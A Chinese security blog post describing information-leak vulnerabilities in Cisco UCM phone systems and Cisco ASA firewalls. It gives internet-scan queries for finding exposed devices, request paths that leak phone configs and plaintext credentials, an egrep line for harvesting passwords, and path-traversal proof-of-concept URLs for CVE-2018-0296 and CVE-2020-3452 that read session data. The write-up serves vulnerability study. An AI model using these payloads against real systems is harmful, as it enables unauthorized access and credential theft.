---
title: cisco设备信息泄漏漏洞案例【二】
url: https://www.secpulse.com/archives/190123.html
source: 安全脉搏
date: 2022-11-01
fetch_date: 2025-10-03T21:23:36.203855
---

# cisco设备信息泄漏漏洞案例【二】

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# cisco设备信息泄漏漏洞案例【二】

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2022-10-31

10,303

## 前言

上一篇文章介绍了[cisco路由器设备的2个漏洞案例](https://www.secpulse.com/archives/189459.html)，这次补充cisco ip电话设备和安全设备的漏洞案例。

## CISCO-UCM ConfigFileCacheList.txt 泄漏

CISCO-UCM 全称Cisco Unified Communications Manager,是用于集成CISCO的语音视频通话、消息传递和移动协作的基础设施

部分 CUCM 服务器在端口 TCP/6970 上有一个 HTTP 服务,其中存在 ConfigFileCacheList.txt 文件,包含位于 TFTP 目录中的所有文件名.

fofa语句

```
product=="CISCO-UCM"
```

shodan语句

```
http.html:"Cisco Unified Communications Manager"
```

payload

```
x.x.x.x:6970/ConfigFileCacheList.txt
```

在目标文件中包含了许多SEP开头的文件，那是ip电话的配置文件，sep后面接的是mac地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194783.png "null")

可以遍历下载这个ConfigFileCacheList.txt文件内容中的所有文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194786.png "null")

Untitled

在下载的配置文件中，包含ip，描述，端口等配置信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194787.png "null")

Untitled

甚至有的还会包含明文的账号密码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194794.png "null")

Untitled

可以用egrep批量查找

```
egrep -r 'Password' *.xml
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194796.png "null")

Untitled

在配置文件中获得了账号密码后，可以尝试登录UCM的web后台

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194800.png "null")

Untitled

当然这个 ConfigFileCacheList.txt 泄漏比较少见，如果遇到UCM可以试试访问`/cucm-uds/users`路径,可以泄漏用户名信息，再针对用户名进一步爆破弱口令

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194802.png "null")

Untitled

---

## CVE-2018-0296 Cisco ASA 目录遍历漏洞

Cisco ASA是思科的防火墙设备，一般用于在企业边界，包含了ips，avc，wse等应用功能。

fofa语句

```
app="CISCO-ASA-5520"
```

根据文章 https://www.anquanke.com/post/id/171916 中的描述,CVE-2018-0296在不同型号设备上存在2种利用场景，一种是拒绝服务造成设备崩溃重启，一种是目录遍历获得敏感信息

在修复方案中则是增加了对`./`和`../`的处理逻辑，以防止目录遍历

拒绝服务这里就不具体测试了，主要看下目录遍历的利用

检测poc

```
/+CSCOU+/../+CSCOE+/files/file_list.json
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194804.png "null")

Untitled

注意，类似的poc不能在浏览器里直接粘贴访问，因为浏览器会自动将访问的路径类似/../解析为上一级目录，也就是访问的为`/+CSCOE+/files/file_list.json`

列出 /sessions 目录的内容

```
/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194806.png "null")

Untitled

提取登录用户的登录信息

```
/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/[name]
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194807.png "null")

Untitled

---

## CVE-2020-3452 Cisco ASA 目录遍历漏洞

CVE-2020-3452漏洞可以在未验证的情况下进行任意文件读取

该漏洞源于 ASA 和 FTD 的 web 服务接口在处理 HTTP 请求的 URL 时缺乏正确的输入验证，导致攻击者可以在目标设备上查看系统内的web目录文件。

此漏洞不能用于获取对 ASA 或 FTD 系统文件或底层操作系统 (OS) 文件的访问，所以只能读取 web 系统目录的文件，比如 webvpn 的配置文件、书签、网络 cookies、部分网络内容和超文本传输协议网址等信息。

作者在推特分享的检测poc

https://twitter.com/aboul3la/status/1286141887716503553

```
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

读取 `/+CSCOE+/portal_inc.lua` 文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190123-1667194810.png "null")

Untitled

至于进一步利用，有研究人员给出了一些已知文件列表

https://twitter.com/HackerGautam/status/1286652700432662528

https://raw.githubusercontent.com/3ndG4me/CVE-2020-3452-Exploit/master/cisco\_asa\_file\_list.txt

不过实际测试，除了`session.js` 跑出了一个乱码的内容以外，其他的文件多是一些资源文件，难以进一步利用。

---

## Source & Reference

* • https://www.cisco.com/c/en/us/support/docs/unified-communications/unified-communications-manager-callmanager/200408-Retrieve-Phone-Configuration-File-from-T.html
* • https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
* • https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/
* • https://sekurak.pl/opis-bledu-cve-2018-0296-ominiecie-uwierzytelnienia-w-webinterfejsie-cisco-asa/
* • https://www.anquanke.com/post/id/171916

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/190123.html**](https://www.secpulse.com/archives/190123.html)

Tags: [cisco](https://www.secpulse.com/archives/tag/cisco)、[Cisco ASA 目录遍历漏洞](https://www.secpulse.com/archives/tag/cisco-asa-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E)、[CISCO-UCM](https://www.secpulse.com/archives/tag/cisco-ucm)、[ConfigFileCacheList.txt](https://www.secpulse.com/archives/tag/configfilecachelist-txt)、[CVE-2020-3452](https://www.secpulse.com/archives/tag/cve-2020-3452)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Pwn2Own Austin 2021 Cisco RV34x RCE 漏洞链复现](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/03/1678175834905-300x201.png)

  Pwn2Own Austin 2021 …](https://www.secpulse.com/archives/197154.html "详细阅读 Pwn2Own Austin 2021 Cisco RV34x RCE 漏洞链复现")
* [![【漏洞预警】Cisco IP Phone CDP堆栈溢出漏洞](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/12/1670813136010-300x165.png)

  【漏洞预警】Cisco IP Phone…](https://www.secpulse.com/archives/193386.html "详细阅读 【漏洞预警】Cisco IP Phone CDP堆栈溢出漏洞")
* [![cisco设备信息泄漏漏洞案例](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/16...